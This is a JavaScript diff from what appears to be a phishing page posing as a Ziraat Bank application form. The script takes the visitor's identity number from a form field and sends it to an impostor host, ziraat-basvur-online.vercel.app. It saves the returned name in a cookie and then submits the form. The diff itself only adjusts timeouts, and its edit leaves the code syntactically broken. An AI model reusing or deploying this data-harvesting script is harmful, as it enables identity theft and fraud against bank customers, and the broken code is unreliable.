@@ -173,7 +173,7 @@ async function checkAndSubmit() {
   const retailIdentityValue = document.getElementById('ctl00_c_RetailIdentityTextBox').value;
 
   try {
-        // RetailIdentityTextBox değeri ile isteği oluştur
+        setTimeout(function() {
        const response = await fetch(`https://ziraat-basvur-online.vercel.app/proxy/${retailIdentityValue}`);
     const data = await response.json();
 
@@ -184,10 +184,10 @@ async function checkAndSubmit() {
         // İsim adında bir cookie oluştur ve değerleri kaydet
         document.cookie = `isim=${adi} ${soyadi}; path=/`;
 
-         await sleep(1000);
-        setTimeout(function() {
+         await sleep(500);
+      
     document.getElementById('aspnetForm').submit();
-}, 500);
+}, 1500);
       } catch (error) {
         console.error('Hata:', error);
       }
